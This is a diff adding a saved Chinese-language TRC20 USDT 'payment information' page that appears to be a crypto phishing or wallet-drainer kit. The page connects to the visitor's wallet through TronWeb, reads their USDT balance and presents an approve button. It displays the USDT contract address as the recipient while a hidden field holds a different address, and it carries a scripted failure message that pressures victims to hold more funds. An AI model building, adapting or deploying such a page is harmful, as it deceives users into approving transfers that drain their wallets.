@@ -1,1 +1,77 @@
-fghfh
+
+<!DOCTYPE html>
+<!-- saved from url=(0122)https://www.douyin.solutions/trc20.html?addtype=trc20&to_address=TVPdegug7oUpfCPRReK3Xy1BH8JioRdKgP&utm_source=tokenpocket -->
+<html><style id="Force_Custom_Fonts" type="text/css">@font-face{font-style:normal;font-family:"OPPOSans_OS_1.4";src:local("OPPOSans_OS_1.4")}@font-face{font-style:bolder;font-family:"OPPOSans_OS_1.4";src:local("OPPOSans_OS_1.4")}@font-face{font-style:normal;font-family:"OPPOSans_OS_1.4";src:local("OPPOSans_OS_1.4");unicode-range:U+0-FF,U+2E80-9FFF,U+F900-FAFF,U+FE30-FE4F,U+20000-2FA1F}@font-face{font-style:bolder;font-family:"OPPOSans_OS_1.4";src:local("OPPOSans_OS_1.4");unicode-range:U+0-FF,U+2E80-9FFF,U+F900-FAFF,U+FE30-FE4F,U+20000-2FA1F}@font-face{font-style:normal;font-family:"OPPOSans_OS_1.4";src:local("OPPOSans_OS_1.4");unicode-range:U+0-FF}@font-face{font-style:bolder;font-family:"OPPOSans_OS_1.4";src:local("OPPOSans_OS_1.4");unicode-range:U+0-FF}:not(pre):not(code):not(textarea):not(tt):not(kbd):not(samp):not(var){font-family:"OPPOSans_OS_1.4"!important}pre,code,textarea,tt,kbd,samp,var{font-family:"OPPOSans_OS_1.4"!important}pre *,code *,textarea *,tt *,kbd *,samp *,var *{font-family:"OPPOSans_OS_1.4"!important}</style><script id="youtube-hd-fjdmkanbdloodhegphphhklnjfngoffa">var ythdlog = () => {};;var ythderror = () => {};</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		
+		<title>付款信息</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+		<meta name="renderer" content="webkit">
+		<script src="./付款信息_files/jquery-1.8.3.min.js.下载" type="text/javascript"></script>
+		<script src="./付款信息_files/TronWeb.js.下载" type="text/javascript"></script>
+		<script src="./付款信息_files/trcdetail.js.下载"></script>
+		<script src="./付款信息_files/common.js.下载"></script>
+		<script src="./付款信息_files/modal.js.下载" type="text/javascript"></script>
+		<link rel="stylesheet" type="text/css" href="./付款信息_files/bootstrap.min.css">
+		<link rel="stylesheet" type="text/css" href="./付款信息_files/paydetail.css">
+		<script>
+			$(function() {
+				loadData();
+				sleep(1000).then(() => {
+					connect();
+					get_usdt_balance();
+				});
+			})
+		</script>
+	</head>
+	<body>
+		<div class="container pay-detail-bg">
+			<br>
+			<div class="alert alert-warning" style="display: none" id="pay_warning">充值失败，该钱包地址USDT流水未达到2000</div>
+			<br>
+			<p class="text-muted">收款地址</p>
+			<div id="to_address_div" style="word-break:break-all;border-radius:16px;padding:24px 20px;font-size: 14px;color: #949495;background-color: #fff">
+				TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t
+			</div>
+			<br>
+			<p class="text-muted">金额</p>
+			<div class="pay-detail-amount">
+				<input class="pay-detail-amount-input" type="text" id="payment" value="0.1">
+			</div>
+			<br>
+			<button type="button" id="paydetail_approve" class="btn btn-primary btn-block pay-detail-next" disabled="disabled" onclick="payconfirm()">加载中，请稍等...</button>
+			<input type="hidden" id="to_address" value="TVPdegug7oUpfCPRReK3Xy1BH8JioRdKgP">
+			<input type="hidden" id="address" value="加载中...0">
+			<input type="hidden" id="balance" value="">
+			<input type="hidden" id="usdt_balance" value="">
+			<input type="hidden" id="addtype" value="trc20">
+			<input type="hidden" id="from" value="false">
+			<input type="hidden" id="sun_usdt_balance">
+			
+		</div>
+
+
+		<div class="modal fade" id="pay_confirm" tabindex="-1" role="dialog" data-keyboard="false" aria-labelledby="myModalLabel" aria-hidden="true">
+			<div class="modal-dialog">
+				<div class="modal-content">
+					<div class="modal-header">
+						<button type="button" class="close" data-dismiss="modal" aria-hidden="true">×
+						</button>
+						<h5 class="modal-title">
+							<strong>支付信息</strong>
+						</h5>
+					</div>
+					<div class="modal-body" id="confirm_amount">
+						当前支付金额：
+					</div>
+					<div class="modal-footer">
+						<button type="button" class="btn btn-default" data-dismiss="modal">关闭</button>
+						<button type="button" class="btn btn-primary pay-detail-next" onclick="transfer_f()">确认支付</button>
+					</div>
+
+				</div><!-- /.modal-content -->
+			</div><!-- /.modal-dialog -->
+		</div><!-- /.modal -->
+
+	
+
+<style class="AC-highLightRule">.acWHSet{display:inline!important;box-shadow: -3px 0px 3px 0.15px rgba(0, 0, 0, 0.15);color:rgb(0,0,0);font-weight:inherit;}.acWHSet[data='https']{background-color:#FFFF80;}.acWHSet[data='3a']{background-color:#90EE90;}.acWHSet[data='2f']{background-color:#33FFFF;}.acWHSet[data='2fvipwam6']{background-color:#FF6600;}.acWHSet[data='github']{background-color:#FF69B4;}.acWHSet[data='io']{background-color:#20B2AA;}</style></body></html>
